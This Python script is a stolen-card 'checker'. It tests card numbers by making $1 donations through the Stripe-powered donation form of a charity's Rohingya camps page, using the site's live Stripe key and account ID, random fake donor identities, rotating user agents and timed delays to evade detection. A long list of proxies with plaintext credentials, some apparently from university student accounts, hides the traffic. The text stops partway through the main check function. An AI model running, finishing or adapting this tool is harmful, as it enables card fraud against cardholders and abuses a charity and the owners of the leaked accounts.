import aiohttp
import asyncio
import random
import uuid
import string
from bs4 import BeautifulSoup


STRIPE_PK = 'pk_live_SMtnnvlq4TpJelMdklNha8iD'
STRIPE_ACCOUNT = 'acct_1GZkMkI3xcyBhfqp'


PROXIES_LIST = [
    # ── Raw IPs ──
    "103.156.91.173:58798:zqrn9y5d:zQRN9y5d",
    "103.161.113.230:18491:dz46cabj:ksuRcKlNqJMU",
    "103.183.121.128:58122:3dfw7c6x:oSeqx0CNeV0k",
    "103.183.121.211:11657:azqdr5vn:71WCPuMwyc72",
    "103.183.121.59:34219:y7g4dd8d:Buw96jtGFKA5",
    "103.204.108.142:12345:naveed:Qwerty_123ABC",
    "103.204.109.189:12345:tickets:proxyon145",
    "104.160.17.116:12345:tickets:proxyon145",
    "107.150.71.197:12345:tickets:proxyon145",
    "107.150.71.30:12345:tickets:proxyon145",
    "107.172.241.122:12345:tickets:proxyon145",
    "107.173.112.194:12345:tickets:proxyon145",
    "135.148.117.75:59813:oldg6k2r:oLdG6k2R",
    "138.94.218.193:12345:tickets:proxyon145",
    "153.121.71.115:822:socialwire:87xb2kziRk4xa",
    "161.0.1.119:12345:tickets:proxyon145",
    "161.0.1.13:12345:tickets:proxyon145",
    "162.212.170.252:12345:tickets:proxyon145",
    "162.212.170.77:12345:tickets:proxyon145",
    "168.228.46.128:12345:tickets:proxyon145",
    "168.228.46.189:12345:tickets:proxyon145",
    "175.29.133.8:5433:799JRELTBPAE:F7BQ7D3EQSQA",
    "175.29.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "181.177.102.240:12345:tickets:proxyon145",
    "181.215.16.247:12345:tickets:proxyon145",
    "185.122.170.10:12345:tickets:proxyon145",
    "185.122.170.73:12345:tickets:proxyon145",
    "190.123.219.12:12345:tickets:proxyon145",
    "190.123.219.34:12345:tickets:proxyon145",
    "191.102.165.164:12345:tickets:proxyon145",
    "192.227.238.145:12345:tickets:proxyon145",
    "193.254.17.97:64708:1DnugnypC:4yPtzMd3f",
    "194.33.9.114:64170:nWtrJqsb:RYYEE72Y",
    "194.33.9.136:49520:nWtrJqsb:RYYEE72Y",
    "196.196.23.136:12345:tickets:proxyon145",
    "196.196.23.45:12345:tickets:proxyon145",
    "196.244.48.124:12345:naveed:Qwerty_123ABC",
    "196.244.48.126:12345:naveed:Qwerty_123ABC",
    "196.244.48.26:12345:naveed:Qwerty_123ABC",
    "196.247.205.113:12345:tickets:proxyon145",
    "196.247.205.228:12345:tickets:proxyon145",
    "196.247.205.48:12345:tickets:proxyon145",
    "196.247.205.88:12345:tickets:proxyon145",
    "196.247.205.91:12345:tickets:proxyon145",

    # ── 202.28.17.8 — Thai university pool ──
    "202.28.17.8:8080:s5802016810053:1549900215617",
    "202.28.17.8:8080:s6003026810028:1720800122226",
    "202.28.17.8:8080:s6202052810029:78496978",
    "202.28.17.8:8080:s6301074610292:za0643250344",
    "202.28.17.8:8080:s6402011520288:surikan123",
    "202.28.17.8:8080:s6402013510115:s1609900520681",
    "202.28.17.8:8080:songponp:neung1nakub",

    # ── More raw IPs ──
    "23.104.162.39:12345:tickets:proxyon145",
    "37.218.219.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "45.145.162.63:58536:nWtrJqsb:RYYEE72Y",
    "5.157.5.100:12345:tickets:proxyon145",
    "5.157.5.154:12345:tickets:proxyon145",
    "5.249.177.8:5433:9T1GYK9U3S2B:SAWF8Y0JHSB0",
    "50.3.137.165:12345:tickets:proxyon145",
    "50.3.137.177:12345:tickets:proxyon145",
    "51.195.198.170:36647:fwos7n0b:fWOS7n0B",
    "82.117.94.14:63126:RrkJjUqfT:jYEH6Emdg",

    # ── pvdata.host pool (shared creds) ──
    "ae-dub.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "at-wie.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-bri.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-mel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-per.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "be-bru.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "bg-sof.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "br-sao.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-van.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ch-zur.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cy-lim.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cz-pra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "de-ber.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "de-fra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "fr-par.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "gr-ath.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "im-bal.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "in-ban.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "is-rey.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "it-mil.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "jp-tok.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "kr-seo.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "lt-sia.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "lu-lux.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "mx-mex.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "my-kua.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "no-osl.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pt-lis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "rs-bel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-got.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-kis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-sto.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "sg-sin.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "th-ban.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "tw-tai.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ua-nik.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "uk-lon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "uk-man.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "vn-hoc.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "za-joh.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",

    # ── g-w.info free proxies ──
    "ca-free-proxy.g-w.info:59785:diehard33:3liubjnixc8456789i",
    "de-free-proxy.g-w.info:59784:smoothysuck:ublIUnbiybkvDfgg",
    "in-free-proxy.g-w.info:59783:dagandnorb:EdsAbQuamAn999",
    "uk-free-proxy.g-w.info:59782:meetthejack:8ohlsid7hlPenEdsAbQ",
    "us-free-proxy.g-w.info:59781:user3proxyserver:huccuAn_oc7o87hubhjYY",

    # ── University proxies ──
    "authproxy.fju.edu.tw:3128:506061324:enya07141013",
    "proxy.sru.ac.th:8080:6115103001019:1819900293950",
    "proxy.sru.ac.th:8080:64052511005:3820800334521",
    "proxy.sru.ac.th:8080:jantawan.ban:jantawan.ban",
    "proxy.sru.ac.th:8080:patarawan.kah:patarawan.kah",
    "proxy.sru.ac.th:8080:prairat.kon:24122529**",
    "proxy.ttu.edu.tw:3128:g10701005:j0i2m2",

    # ── cactussstp.com — au1 ──
    "au1.cactussstp.com:81:bvmbsmie:shibby2511",
    "au1.cactussstp.com:81:hughmuir2:lisamarie11",
    "au1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "au1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "au1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "au1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "au1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "au1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "au1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ca1 ──
    "ca1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ca1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ca1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ch1 ──
    "ch1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:81:yefprelf:dr2gsmab",
    "ch1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "ch1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── es1 ──
    "es1.cactussstp.com:81:bvmbsmie:shibby2511",
    "es1.cactussstp.com:81:hughmuir2:lisamarie11",
    "es1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:81:yefprelf:dr2gsmab",
    "es1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "es1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "es1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "es1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "es1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "es1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── in1 ──
    "in1.cactussstp.com:81:bvmbsmie:shibby2511",
    "in1.cactussstp.com:81:hughmuir2:lisamarie11",
    "in1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:81:yefprelf:dr2gsmab",
    "in1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "in1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "in1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "in1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "in1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "in1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── it1 ──
    "it1.cactussstp.com:81:bvmbsmie:shibby2511",
    "it1.cactussstp.com:81:hughmuir2:lisamarie11",
    "it1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "it1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "it1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "it1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── lv1 ──
    "lv1.cactussstp.com:81:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:81:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "lv1.cactussstp.com:81:yefprelf:dr2gsmab",
    "lv1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "lv1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "lv1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── my1 ──
    "my1.cactussstp.com:81:bvmbsmie:shibby2511",
    "my1.cactussstp.com:81:hughmuir2:lisamarie11",
    "my1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "my1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "my1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "my1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "my1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "my1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "my1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── pt1 ──
    "pt1.cactussstp.com:81:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:81:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:81:yefprelf:dr2gsmab",
    "pt1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "pt1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── ro1 ──
    "ro1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ru1 ──
    "ru1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ru1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ru1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── uk2 ──
    "uk2.cactussstp.com:81:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:81:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "uk2.cactussstp.com:3129:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "uk2.cactussstp.com:8080:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:8080:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── uk3 ──
    "uk3.cactussstp.com:81:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:81:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "uk3.cactussstp.com:3129:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "uk3.cactussstp.com:8080:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:8080:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us1 ──
    "us1.cactussstp.com:81:bvmbsmie:shibby2511",
    "us1.cactussstp.com:81:hughmuir2:lisamarie11",
    "us1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us2 ──
    "us2.cactussstp.com:81:bvmbsmie:shibby2511",
    "us2.cactussstp.com:81:hughmuir2:lisamarie11",
    "us2.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us2.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us2.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us2.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us2.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us2.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us2.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us3 ──
    "us3.cactussstp.com:81:bvmbsmie:shibby2511",
    "us3.cactussstp.com:81:hughmuir2:lisamarie11",
    "us3.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us3.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us3.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us3.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us3.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us3.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us3.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us4 ──
    "us4.cactussstp.com:81:bvmbsmie:shibby2511",
    "us4.cactussstp.com:81:hughmuir2:lisamarie11",
    "us4.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us4.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us4.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us4.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us4.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us6 ──
    "us6.cactussstp.com:81:bvmbsmie:shibby2511",
    "us6.cactussstp.com:81:hughmuir2:lisamarie11",
    "us6.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us6.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us6.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us6.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us6.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us6.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us6.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us9 ──
    "us9.cactussstp.com:81:bvmbsmie:shibby2511",
    "us9.cactussstp.com:81:hughmuir2:lisamarie11",
    "us9.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us9.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us9.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us9.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
]

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9RT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

FIRST_NAMES = [
    "John", "James", "Robert", "Michael", "William", "David", "Joseph", "Thomas",
    "Christopher", "Charles", "Daniel", "Matthew", "Anthony", "Mark", "Donald",
    "Steven", "Andrew", "Paul", "Joshua", "Kenneth", "Kevin", "Brian", "George"
]

LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
    "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson"
]

EMAIL_DOMAINS = [
    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com",
    "icloud.com", "mail.com", "zoho.com", "yandex.com", "aol.com"
]

STREET_NAMES = ["Main St", "Oak St", "Pine St", "Maple Ave", "Cedar Rd", "Elm Blvd"]
CITIES = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia"]
STATES = ["ny", "ca", "il", "tx", "az", "pa"]
ZIP_CODES = ["10001", "90001", "60601", "77001", "85001", "19101"]

def parse_proxy(proxy_string):
    """Parse proxy string to aiohttp proxy format"""
    if not proxy_string:
        return None
    proxy_string = proxy_string.strip()


    if proxy_string.startswith(('http://', 'https://')):
        return proxy_string

    parts = proxy_string.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f'http://{user}:{pwd}@{ip}:{port}'
    if len(parts) == 2:
        ip, port = parts
        return f'http://{ip}:{port}'
    return None

def generate_random_name():
    return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"

def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    return f"{username}@{random.choice(EMAIL_DOMAINS)}"

def generate_random_address():
    return {
        'line1': f"{random.randint(100, 9999)} {random.choice(STREET_NAMES)}",
        'line2': f"Apt {random.randint(1, 50)}",
        'city': random.choice(CITIES),
        'state': random.choice(STATES),
        'postal_code': random.choice(ZIP_CODES),
        'country': 'US'
    }

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def extract_error_info(response_data):
    result = {"decline_code": None, "message": None}
    if not response_data or not isinstance(response_data, dict):
        return result
    for key in ('error', 'last_payment_error'):
        error = response_data.get(key)
        if isinstance(error, dict):
            result["decline_code"] = error.get('decline_code')
            result["message"] = error.get('message')
            if result["decline_code"] or result["message"]:
                break
    return result

async def get_form_hash(session, proxy=None):
    """Get form hash from mountainofmercy.org"""
    try:
        headers = {
            'x-requested-with': 'XMLHttpRequest',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': get_random_user_agent(),
            'referer': 'https://mountainofmercy.org/give/rohingya-camps/',
            'origin': 'https://mountainofmercy.org'
        }
        data = {
            'action': 'give_donation_form_reset_all_nonce',
            'give_form_id': '3703'
        }

        async with session.post(
            "https://mountainofmercy.org/wp-admin/admin-ajax.php",
            headers=headers,
            data=data,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=30)
        ) as resp:
            response_data = await resp.json(content_type=None)
            return response_data.get('data', {}).get('give_form_hash')
    except Exception:
        return None

async def create_payment_method(session, card_number, exp_month, exp_year, cvv, proxy=None):
    """Create payment method via Stripe API"""
    guid, muid = str(uuid.uuid4()), str(uuid.uuid4())
    name = generate_random_name()
    email = generate_random_email()
    address = generate_random_address()

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': get_random_user_agent(),
    }


    data = {
        'type': 'card',
        'billing_details[name]': name,
        'billing_details[email]': email,
        'billing_details[address][line1]': address['line1'],
        'billing_details[address][line2]': address['line2'],
        'billing_details[address][city]': address['city'],
        'billing_details[address][state]': address['state'],
        'billing_details[address][postal_code]': address['postal_code'],
        'billing_details[address][country]': address['country'],
        'card[number]': card_number,
        'card[cvc]': cvv,
        'card[exp_month]': exp_month,
        'card[exp_year]': exp_year,
        'guid': guid,
        'muid': muid,
        'payment_user_agent': f'stripe.js/badb92382f; stripe-js-v3/badb92382f; split-card-element',
        'key': STRIPE_PK,
        '_stripe_account': STRIPE_ACCOUNT
    }

    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=30)
        ) as resp:
            response_data = await resp.json(content_type=None)
            if resp.status == 200:
                return response_data.get('id'), None
            err = response_data.get('error', {})
            return None, err.get('message') or err.get('code') or 'Unknown Error'
    except Exception as e:
        return None, str(e)

async def make_donation(session, payment_method_id, form_hash, proxy=None):
    """Process the donation using the payment method"""
    name = generate_random_name()
    first_name = name.split()[0]
    last_name = name.split()[1] if len(name.split()) > 1 else "Doe"
    email = generate_random_email()

    headers = {
        'user-agent': get_random_user_agent(),
        'referer': 'https://mountainofmercy.org/give/rohingya-camps/',
        'origin': 'https://mountainofmercy.org',
        'content-type': 'application/x-www-form-urlencoded',
    }

    data = {
        'give-form-id': '3703',
        'give-form-hash': form_hash,
        'give-amount': '1',
        'give-form-minimum': '1',
        'give_stripe_payment_method': payment_method_id,
        'give_first': first_name,
        'give_last': last_name,
        'give_email': email,
        'payment-mode': 'stripe_checkout',
        'give_action': 'purchase',
        'give-gateway': 'stripe_checkout'
    }

    try:
        async with session.post(
            "https://mountainofmercy.org/give/rohingya-camps/",
            params={'payment-mode': 'stripe_checkout', 'form-id': '3703'},
            headers=headers,
            data=data,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=30),
            allow_redirects=True
        ) as resp:
            response_text = await resp.text()
            soup = BeautifulSoup(response_text, 'html.parser')


            error_div = soup.find("div", {"id": "give_error_stripe_payment_intent_error"})
            if error_div:
                error_msg = error_div.get_text(strip=True).lower()
                if 'cvc' in error_msg or 'security code' in error_msg:
                    return {"status": "declined", "decline_code": "incorrect_cvc", "response": error_msg}
                if 'insufficient funds' in error_msg:
                    return {"status": "declined", "decline_code": "insufficient_funds", "response": error_msg}
                if '3d' in error_msg or 'authentication' in error_msg:
                    return {"status": "declined", "decline_code": "authentication_required", "response": error_msg}
                return {"status": "declined", "decline_code": "generic_decline", "response": error_msg}


            if 'thank-you' in str(resp.url) or 'success' in response_text.lower():
                return {"status": "charged", "decline_code": "succeeded", "response": "Your card was charged"}

            return {"status": "declined", "decline_code": "generic_decline", "response": "Card was declined"}
    except Exception as e:
        return {"status": "error", "decline_code": None, "response": str(e)[:100]}

async def _do_check_async(card_number, exp_month, exp_year, cvv, proxy=None):
    """
    Fully async Stripe check using mountainofmercy.org donation flow.
    """
    user_agent = get_random_user_agent()
    timeout = aiohttp.ClientTimeout(total=30, connect=10)
    connector = aiohttp.TCPConnector(ssl=False, limit=0)

    async with aiohttp.ClientSession(
        timeout=timeout,
        connector=connector,
        headers={"User-Agent": user_agent}
    ) as session:


        await asyncio.sleep(random.uniform(0.5, 1.5))
        form_hash = await get_form_hash(session, proxy=proxy)

        if not form_hash:
            raise Exception("Failed to get form hash - site might be down")

        await asyncio.sleep(random.uniform(0.5, 1.0))


        payment_method_id, error = await create_payment_method(
            session, card_number, exp_month, exp_year, cvv, proxy=proxy
        )

